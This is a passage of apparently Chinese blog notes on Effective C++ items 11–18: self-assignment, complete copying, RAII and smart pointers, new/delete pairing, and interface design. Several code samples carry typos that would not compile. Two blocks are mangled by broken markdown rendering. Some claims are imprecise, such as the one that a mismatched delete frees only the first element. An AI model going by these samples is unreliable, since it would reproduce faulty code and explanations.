punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//还可以使用另一种形式</span>Widget<span class="token operator">&amp;</span> Widget<span class="token operator">::</span><span class="token function">operator</span><span class="token punctuation">(</span>Widget rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">swap</span><span class="token punctuation">(</span>rhs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>这样的代码虽然可能违反了函数要使用常量引用传递的惯例，但这样做确实能减少源代码和目标代码的长度，增加了效率。</li></ul><p>总结：</p><ul><li>赋值操作符要考虑到自赋值，使用参数身份检测，排列语句，先拷贝再调换的方法来确保代码是自赋值安全的。</li><li>同样当一个函数使用多个参数时，也要确保函数能在这些参数同时指向同一个对象时可以工作正常。</li></ul><h2 id="条款12-完整拷贝对象"><a href="#条款12-完整拷贝对象" class="headerlink" title="条款12 完整拷贝对象"></a>条款12 完整拷贝对象</h2><p>C++有两种拷贝函数(copying function): 拷贝构造函数(copy constructor)和拷贝赋值操作符(copy assignment operator)。如果在自己定义的类中不声明这些拷贝函数，编译器会自动为你生成。如果我们声明了自己的拷贝函数，程序将会执行我们自己的拷贝函数。</p><p>查看以下例子：<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">logCall</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> funcName<span class="token punctuation">)</span><span class="token punctuation">;</span>class Customer<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token function">Customer</span><span class="token punctuation">(</span><span class="token keyword">const</span> Customer<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">;</span>    Customer<span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Customer<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">;</span>  private<span class="token operator">:</span>    std<span class="token operator">::</span>string name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Customer<span class="token operator">::</span><span class="token function">Customer</span><span class="token punctuation">(</span><span class="token keyword">const</span> Customer<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">name</span><span class="token punctuation">(</span>rhs<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">//使用初始化列表</span>  <span class="token function">logCall</span><span class="token punctuation">(</span><span class="token string">"Customer copy constructor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Customer<span class="token operator">&amp;</span> Customer<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Customer<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">logCall</span><span class="token punctuation">(</span><span class="token string">"Customer copy assignment operator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  name <span class="token operator">=</span> rhs<span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token comment">//拷贝数据</span>  <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span>       <span class="token comment">//返回*this，见第10章</span><span class="token punctuation">&#125;</span></code></pre><br>如果新增一个数据成员：<br><pre class="language-c" data-language="c"><code class="language-c">class Date<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Cutomer<span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    std<span class="token operator">::</span>string name<span class="token punctuation">;</span>    Data lastTransaction<span class="token punctuation">;</span>     <span class="token comment">//新增了一个交易日期的数据成员</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>如果依然使用相同的两种拷贝函数，只能得到一个部分拷贝对象。</p><p>C++的这两种拷贝函数有相似的功能和代码，如果想要节省代码，可以写另一个函数来给每个成员赋值，一般叫做init()</p><p>总结：</p><ul><li>拷贝函数要照顾到类的所有部分，包括所有的数据成员和它的基类部分</li><li>不要用一个拷贝函数来实现另一个拷贝函数，两种拷贝函数的语义不同。如果要节省代码，可以另写一个init()函数让两个拷贝函数来调用。</li></ul><h1 id="资源管理-条款-13-17"><a href="#资源管理-条款-13-17" class="headerlink" title="资源管理 条款(13~17)"></a>资源管理 条款(13~17)</h1><h2 id="条款13-用对象来管理资源"><a href="#条款13-用对象来管理资源" class="headerlink" title="条款13  用对象来管理资源"></a>条款13  用对象来管理资源</h2><p>资源是一个很宽泛的概念，但总体来讲，资源是我们可以用来使用，并且使用完之后要返还给系统的东西。在C++中，资源多数是指动态分配的内存。如果你只用new来分配内存却不在使用完后delete掉，将会导致内存泄漏。</p><p>其他资源比如文件描述符(file descriptor)，Mutex锁，GUI中的字体(font)和画刷(brush)，网络接口(socket)，但不论资源是什么，我们一定要保证在使用过后要及时释放，否则就会造成资源泄露。当我们的代码变得越来越复杂，比如增加了异常抛出，函数不同的返回路径，手动管理资源将会变得费时费力，因此我们需要用对象来管理资源。</p><p>假设我们在为不同类型的投资写一个库:<br><pre class="language-c" data-language="c"><code class="language-c">class Investment<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token comment">//Investment继承层级的基类</span>Investment<span class="token operator">*</span> <span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//返回一个动态分配的Investment层级对象指针</span></code></pre><br>返回一个指针就说明我们要负责在用毕后及时释放资源:<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  Intestment<span class="token operator">*</span> pInv <span class="token operator">=</span> <span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//分配</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                    <span class="token comment">//使用</span>  delete pInv<span class="token punctuation">;</span>                           <span class="token comment">//释放</span><span class="token punctuation">&#125;</span></code></pre><br>如果中间部分存在并触发了一个return语句，最后的delete语句便会被跳过。如果用在循环里，中间存在并触发了break或goto语句，delete也不会被执行。同样如果中间的代码抛出了异常，这个指针也不会被删除掉。如果这个动态分配的对象没有被清理掉，不仅仅是它占用的内存资源泄露，它所占有的所有资源也将泄露。</p><p>解决方法：<br>使用引用计数的智能指针(Reference-Counting Smart Pointer, RCSP)，它在运行时会统计有多少对象指向当前的资源，然后当没有任何对象指向当前资源时便会自动释放，<code>shared_ptr</code>可以在STL容器中使用。<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Investment<span class="token operator">></span> <span class="token function">pInv</span><span class="token punctuation">(</span><span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>  <span class="token comment">//无需手动释放</span>std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Investment<span class="token operator">></span> <span class="token function">pInv1</span><span class="token punctuation">(</span><span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>investment<span class="token operator">></span> <span class="token function">pInv2</span><span class="token punctuation">(</span>pInv1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//pInv1保持不变</span>pInv1 <span class="token operator">=</span> pInv2<span class="token punctuation">;</span>                                  <span class="token comment">//pInv2保持不变</span></code></pre><br>使用智能指针只是用对象管理资源的方法之一，而且也存在着局限性。例如我们不能使用标准库的智能指针来指向一个动态分配的数组。</p><p>总结：</p><ul><li>防止资源泄露，从RAII做起。获取资源在构造过程中，释放资源在析构过程中。</li><li><code>std::shared_ptr</code>和<code>auto_ptr</code>是两个常用的RAII类。一般情况下<code>std1::shared_ptr</code>是更好的选择，因为它的拷贝不会影响到其它对象，并且支持STL容器。</li></ul><h2 id="条款14-资源管理类的拷贝"><a href="#条款14-资源管理类的拷贝" class="headerlink" title="条款14 资源管理类的拷贝"></a>条款14 资源管理类的拷贝</h2><p>对于堆之外的资源，例如Mutex锁，智能指针就不太好用。<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span>Mutex<span class="token operator">*</span> pm<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//锁住pm指向的锁</span><span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span>Mutex<span class="token operator">*</span> pm<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//解锁pm指向的锁</span></code></pre><br>同时我们有一个符合RAII规范的类来管理这些锁，RAII即获取资源在对象构造过程中，释放资源在对象析构过程中:<br><pre class="language-c" data-language="c"><code class="language-c">class Lock<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    explicit <span class="token function">Lock</span><span class="token punctuation">(</span>Mutex <span class="token operator">*</span>pm<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">mutexPtr</span><span class="token punctuation">(</span>pm<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">lock</span><span class="token punctuation">(</span>mutexPtr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>                             <span class="token comment">//在构造时获取资源，上锁</span>    <span class="token operator">~</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">unlock</span><span class="token punctuation">(</span>mutexPtr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">//在析构时释放资源，解锁</span>private<span class="token operator">:</span>    Mutex <span class="token operator">*</span>mutexPtr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>例如访问临界区(critical section), 临界区即线程必须互斥地访问某些资源，这些资源必须只能由最多一个线程访问，我们就需要以RAII的方式来进行操作:<br><pre class="language-c" data-language="c"><code class="language-c">Mutex m<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span>              <span class="token comment">//创建一个代码块来定义临界区</span>  Lock <span class="token function">ml</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//构造锁ml，锁住m</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>          <span class="token comment">//执行临界区操作</span><span class="token punctuation">&#125;</span>              <span class="token comment">//临界区结束，调用ml的析构函数，解锁</span></code></pre><br>到现在为止以上的用法都是没有问题的，如果锁被拷贝了呢？<br><pre class="language-c" data-language="c"><code class="language-c">Lock <span class="token function">ml1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//m在ml1的构造过程中被锁住</span>Lock <span class="token function">ml2</span><span class="token punctuation">(</span>ml1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//把ml1拷贝进ml2，会发生什么?</span></code></pre><br>在创建自己的RAII资源管理类时，我们必须要思考需要如何规定这个类的拷贝行为。对于这个问题，我们有如下选择:</p><ul><li>禁止拷贝<br>如条款6中的把拷贝函数声明为私有来禁止拷贝</li><li>给资源引用计数：<br>有时需要一直持有一个资源直到最后一个对象使用完毕，要实现这样的功能，必须有一个计数器来统计当前有多少对象在使用这个资源。当生成一个拷贝时加一，当删除一个拷贝时减一，和<code>shared_ptr</code>是一样的原理。<br>可以替代裸指针把<code>shared_ptr</code>作为RAII对象的数据成员来实现这个功能，将<code>mutexPtr</code>的类型从<code>Mutex*</code>变成<code>shared_ptr&lt;Mutex&gt;</code>。我们知道默认下的<code>shared_ptr</code>在引用计数为零时会删除掉它所包含的指针，但对于<code>Mutex</code>锁，我们想要的是解锁而不是删除掉，否则我们是没有办法解开一个被删除的锁的。<pre class="language-shared_ptr```提供了一个特殊的可定义函数，删除器(deleter)，即在引用计数为零时调用的函数，是```shared_ptr```构造函数的一个附加参数。这个函数在```auto_ptr```中是不存在的，因此它不能有自定义的删除行为，只能删除掉它包括的指针。" data-language="shared_ptr```提供了一个特殊的可定义函数，删除器(deleter)，即在引用计数为零时调用的函数，是```shared_ptr```构造函数的一个附加参数。这个函数在```auto_ptr```中是不存在的，因此它不能有自定义的删除行为，只能删除掉它包括的指针。"><code class="language-shared_ptr```提供了一个特殊的可定义函数，删除器(deleter)，即在引用计数为零时调用的函数，是```shared_ptr```构造函数的一个附加参数。这个函数在```auto_ptr```中是不存在的，因此它不能有自定义的删除行为，只能删除掉它包括的指针。">&#96;&#96;&#96;cclass Lock&#123;  public:    explicit Lock(Mutex* pm)    :mutexPtr(pm, unlock)    &#x2F;&#x2F;将unlock函数绑定到删除器    &#123;lock(mutexPtr.get());&#125;    &#x2F;&#x2F;这里其实不需要定义析构函数  private:    std::shared_ptr&lt;Mutex&gt; mutexPtr; &#x2F;&#x2F;使用shared_ptr，不使用裸指针&#125;;</code></pre></li><li><p>深拷贝封装的资源：<br>有时候我们可以拥有某个资源的多份拷贝，那么我们的资源管理类就要确保每一份拷贝都要在使用周期结束后释放资源，并且每一份拷贝互不干涉，因此拷贝这样的对象就要拷贝它包含的所有资源，进行深拷贝(deep copy)。例如当对象包含一个指针，我们必须先生成一个指针的拷贝，分配一个新的内存空间再把数据拷贝过来，这就是深拷贝。如果是浅拷贝，拷贝则直接使用了本体的指针成员，没有生成指针的拷贝，那么两个对象的指针成员就会指向同一个地址，删除拷贝就会导致本体被删除。</p></li><li><p>转移所有权：<br>有时候想要只有一个对象来持有这个资源，因此进行拷贝的时候，资源的所有权就要从本体转移到拷贝上，本体不再持有资源</p></li></ul><p>总结：</p><ul><li>拷贝RAII资源管理类的对象要根据它所包含的资源来具体考虑，我们想要资源展现出如何的拷贝行为，资源管理类就要展现出同样的拷贝行为。</li><li>常用的RAII类的拷贝行为有禁止拷贝，使用引用计数，拷贝资源，转移所有权，但也可以用其他做法来符合特殊需要。</li></ul><h2 id="条款15-提供对原始资源的访问"><a href="#条款15-提供对原始资源的访问" class="headerlink" title="条款15 提供对原始资源的访问"></a>条款15 提供对原始资源的访问</h2><p>使用条款13中的投资栗子：<br><pre class="language-c" data-language="c"><code class="language-c">std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Investment<span class="token operator">></span> <span class="token function">pInv</span><span class="token punctuation">(</span><span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//某个Investment的智能指针对象</span></code></pre><br>现有函数：<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">daysHeld</span><span class="token punctuation">(</span><span class="token keyword">const</span> Investment<span class="token operator">*</span> pi<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//返回某个Investment对象的持有时间</span></code></pre><br>如果直接把智能指针对象传入上面的函数中：<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> days <span class="token operator">=</span> <span class="token function">daysHeld</span><span class="token punctuation">(</span>pInv<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><br>这样编译器会报错，因为函数需要裸指针类型的参数，而你传入的是智能指针类型。你需要做的也很简单，把智能指针转换为裸指针，使用隐式转换或者显式转换。</p><p>shared_ptr有一个成员函数get()，用来执行显式转换，返回智能指针对象所包含的裸指针:</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> days <span class="token operator">=</span> <span class="token function">daysHeld</span><span class="token punctuation">(</span>pInv<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>shared_ptr重载了指针的解引用运算符，即-&gt;和*，这意味着我们可以通过它们来实现隐式转换：</p><pre class="language-c" data-language="c"><code class="language-c">class Investment<span class="token punctuation">&#123;</span>  <span class="token comment">//定义Investment继承层次的基类</span>  public<span class="token operator">:</span>    boos <span class="token function">isTaxFree</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Investment<span class="token operator">*</span> <span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//用来返回指向Investment对象的指针</span>std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Investment<span class="token operator">></span> <span class="token function">pi1</span><span class="token punctuation">(</span><span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//使用shared_ptr管理资源</span>bool taxable1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span>pi1<span class="token operator">-></span><span class="token function">isTaxFree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//使用->操作符接触资源</span></code></pre><p>有时我们需要把RAII资源管理对象所封装的原始资源拿出来，我们可以定义一个转换函数，将资源管理类隐式或显式转换为原始资源。例如要实现对C API中的字体类型(font)的资源管理:<br><pre class="language-c" data-language="c"><code class="language-c">FontHandle <span class="token function">getFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//C API定义的分配字体函数</span><span class="token keyword">void</span> <span class="token function">releaseFont</span><span class="token punctuation">(</span>FontHandle fh<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//C API定义的释放字体函数</span></code></pre></p><p>现在我们定义自己的RAII资源管理类：<br><pre class="language-c" data-language="c"><code class="language-c">class Font<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    explicit <span class="token function">Font</span><span class="token punctuation">(</span>FontHandle fh<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token comment">//C只能使用值传递</span>    <span class="token function">f</span><span class="token punctuation">(</span>fh<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">//构造时获取资源</span>    <span class="token operator">~</span><span class="token function">Font</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">releaseFont</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token comment">//析构时释放资源</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    FontHandle f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>如果我们要使用某些C API只能使用FontHandle类型，我们就需要把Font类型显式转换为FontHandle类型，因此我们定义一个显式转换的函数get():<br><pre class="language-c" data-language="c"><code class="language-c">class Font<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  FontHandle <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token comment">//显式转换函数</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>这样写有两个缺点，第一个就是每次显示转换都需要使用get()函数；第二个<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">changeFontSize</span><span class="token punctuation">(</span>FontHandle f<span class="token punctuation">,</span> <span class="token keyword">int</span> newSize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//改变字体大小的C API</span>Font <span class="token function">f</span><span class="token punctuation">(</span><span class="token function">getFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> newFontSize<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">changeFontSize</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> newFontSize<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//需要使用get()来显式转换</span></code></pre></p><p>总结：</p><ul><li>API通常需要使用原始资源作为参数，因此我们的RAII资源管理类要保证它所封装的资源是对外界可接触的。</li><li>可以通过隐式转换或显式转换来实现对外接触。显式转换总体上更安全，隐式转换则对用户更加方便。</li></ul><h2 id="条款16-成对使用new和delete时需要使用对应的形式"><a href="#条款16-成对使用new和delete时需要使用对应的形式" class="headerlink" title="条款16 成对使用new和delete时需要使用对应的形式"></a>条款16 成对使用new和delete时需要使用对应的形式</h2><p>考虑如下栗子：<br><pre class="language-c" data-language="c"><code class="language-c">std<span class="token operator">::</span>string <span class="token operator">*</span>strArr <span class="token operator">=</span> new std<span class="token operator">::</span>string<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//动态分配100元素的字符串数组</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token comment">//使用</span>delete strArr<span class="token punctuation">;</span>  <span class="token comment">//释放</span></code></pre><br>这样只会释放第一个元素。</p><p>当使用<code>new</code>运算符的时候会发生两件事，申请的内存空间会先被分配出来，然后一个或者多个对象的构造函数被调用来填满这些空间。当使用<code>delete</code>的时候，则是先调用这些对象的析构函数，最后释放内存资源。</p><pre class="language-delete```要删除多少个对象取决于在当前内存空间中调用多少个析构函数，那么编译器就需要知道到底是删除单个对象还是一个数组，因为单个对象和一个数组的对象有不同的内存布局：数组的内存除了它所包含的对象，还包括了一个额外的数，即数组的大小，用来告诉编译器调用多少个析构函数:" data-language="delete```要删除多少个对象取决于在当前内存空间中调用多少个析构函数，那么编译器就需要知道到底是删除单个对象还是一个数组，因为单个对象和一个数组的对象有不同的内存布局：数组的内存除了它所包含的对象，还包括了一个额外的数，即数组的大小，用来告诉编译器调用多少个析构函数:"><code class="language-delete```要删除多少个对象取决于在当前内存空间中调用多少个析构函数，那么编译器就需要知道到底是删除单个对象还是一个数组，因为单个对象和一个数组的对象有不同的内存布局：数组的内存除了它所包含的对象，还包括了一个额外的数，即数组的大小，用来告诉编译器调用多少个析构函数:">&#96;&#96;&#96;cint a[5] &#x3D; &#123;0&#125;;int *b &#x3D; new int[5];std::cout &lt;&lt; sizeof(a) &lt;&lt; &quot; &quot; &lt;&lt; sizeof(b) &lt;&lt; &quot;\n&quot;;&#x2F;&#x2F;结果： 20 8</code></pre><p>总结：</p><ul><li>如果在<code>new</code>语句中使用了[ ]，就必须在对应的<code>delete</code>语句中也使用[ ]。如果在new语句中没有使用[ ]，就不要在对应的<code>delete</code>语句中使用[ ]。</li></ul><h2 id="条款17-以独立语句将newed对象置入智能指针"><a href="#条款17-以独立语句将newed对象置入智能指针" class="headerlink" title="条款17 以独立语句将newed对象置入智能指针"></a>条款17 以独立语句将newed对象置入智能指针</h2><p>考虑以下代码：<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">processWidget</span><span class="token punctuation">(</span>std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Widget<span class="token operator">></span> pw<span class="token punctuation">,</span> <span class="token keyword">int</span> priority<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">processWidget</span><span class="token punctuation">(</span>std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">(</span>new Widget<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><br>C++中，一条语句里面的函数调用顺序是不确定的，所以代码可以拆分成三条语句：<br><pre class="language-c" data-language="c"><code class="language-c">new Widget<span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">)</span>std<span class="token operator">::</span>tr1<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><br>如果编译器首先执行了第三条语句，那么就会导致new Widget创建的对象还没加入到shared_ptr中，会造成资源泄漏。正确的做法应该是：<br><pre class="language-c" data-language="c"><code class="language-c">std<span class="token operator">::</span>tr1<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Widget<span class="token operator">></span> <span class="token function">pw</span><span class="token punctuation">(</span>new Widget<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">processWidget</span><span class="token punctuation">(</span>pw<span class="token punctuation">,</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></p><p>总结：</p><ul><li>以独立语句将newed对象置入智能指针类，如果不这样做，一旦异常抛出可能回导致资源泄露。</li></ul><h1 id="设计与申明-条款-18"><a href="#设计与申明-条款-18" class="headerlink" title="设计与申明 条款(18 ~ )"></a>设计与申明 条款(18 ~ )</h1><h2 id="条款18-让接口容易被使用，难以被误用"><a href="#条款18-让接口容易被使用，难以被误用" class="headerlink" title="条款18 让接口容易被使用，难以被误用"></a>条款18 让接口容易被使用，难以被误用</h2><h3 id="1、设计不容易被错误使用的接口"><a href="#1、设计不容易被错误使用的接口" class="headerlink" title="1、设计不容易被错误使用的接口"></a>1、设计不容易被错误使用的接口</h3><p>考虑如下代码：<br><pre class="language-c" data-language="c"><code class="language-c">class Date<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>  <span class="token function">Date</span><span class="token punctuation">(</span><span class="token keyword">int</span> month<span class="token punctuation">,</span><span class="token keyword">int</span> day<span class="token punctuation">,</span><span class="token keyword">int</span> year<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></p><p>像这样的接口极其容易用错，很多这种错误可以通过引入新类型加以更正：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">Day</span><span class="token punctuation">&#123;</span>  explicit <span class="token function">Day</span><span class="token punctuation">(</span><span class="token keyword">int</span> d<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">val</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> vla<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">Month</span><span class="token punctuation">&#123;</span>  explicit <span class="token function">Month</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">val</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">Year</span><span class="token punctuation">&#123;</span>  explicit <span class="token function">Year</span><span class="token punctuation">(</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">val</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>class Date<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>  <span class="token function">Date</span><span class="token punctuation">(</span><span class="token keyword">const</span> Month<span class="token operator">&amp;</span> m<span class="token punctuation">,</span> <span class="token keyword">const</span> Day<span class="token operator">&amp;</span> d<span class="token punctuation">,</span> <span class="token keyword">const</span> Year<span class="token operator">&amp;</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>Date <span class="token function">d</span><span class="token punctuation">(</span><span class="token function">Month</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">Day</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">Year</span><span class="token punctuation">(</span><span class="token number">1995</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//使用这种方法更加不容易出错，使用封装好的更加好</span></code></pre><p>下述是一个更加安全的方式：</p><pre class="language-c" 